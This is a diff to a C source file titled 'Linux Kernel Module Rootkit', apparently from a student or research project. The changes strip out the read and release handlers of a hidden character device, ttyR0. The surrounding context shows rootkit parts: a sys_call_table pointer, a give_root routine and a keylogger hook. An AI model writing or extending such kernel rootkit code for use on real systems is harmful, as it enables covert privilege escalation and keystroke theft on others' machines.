@@ -1,6 +1,6 @@
 // lkmr.c
 // Alex Cater & Andrew Parker
-// 2019-10-24
+// 2019-12-11
 // Linux Kernel Module Rootkit
 
 #include <linux/module.h>	/* Needed by all modules */
@@ -40,9 +40,9 @@ static int 	__init init_main(void);
 static void __exit cleanup(void);
 static int setup_device(void);
 static int     dev_open  (struct inode *inode, struct file *f);
-static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
+//static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
-static int dev_release(struct inode *inodep, struct file *filep);
+//static int dev_release(struct inode *inodep, struct file *filep);
 
 // defined in logger.c
 static int run_keylogger(void);
@@ -61,23 +61,17 @@ static int exit_keylogger(void);
 #define  DEVICE_NAME "ttyR0"
 #define  CLASS_NAME  "ttyRK"
 
-//#define BUF_LEN (PAGE_SIZE << 2)
-
 static unsigned long *sys_call_table;
 
 static int majorNumber;
 static struct class* rootcharClass = NULL;
 static struct device* rootcharDevice = NULL;
-static int numberOpens = 0;
-//static char receive[BUF_LEN];
 
 static struct file_operations fops =
 {
   .owner = THIS_MODULE,
 	.open = dev_open,
-	.read = dev_read,
 	.write = dev_write,
-	.release = dev_release,
 };
 
 // *********************************************************************
@@ -140,6 +134,7 @@ static int dev_open (struct inode *inode, struct file *f)
 }
 
 // called each time data is sent from the device to user space
+/*
 static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
 {
   static char  message[] = "Hello, this is a message from the kernel\n";
@@ -159,7 +154,7 @@ static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
       return -EFAULT;
    }
   return len;
-}
+}*/
 
 static int give_root(void)
 {
@@ -217,13 +212,6 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	}	
 	return len;
 }
-
-// Called when the device is closed in user space.
-static int dev_release(struct inode *inodep, struct file *filep)
-{
-	//printk ("Device release\n");
-	return 0;
- }
 
 // *********************************************************************
 //  init and exit
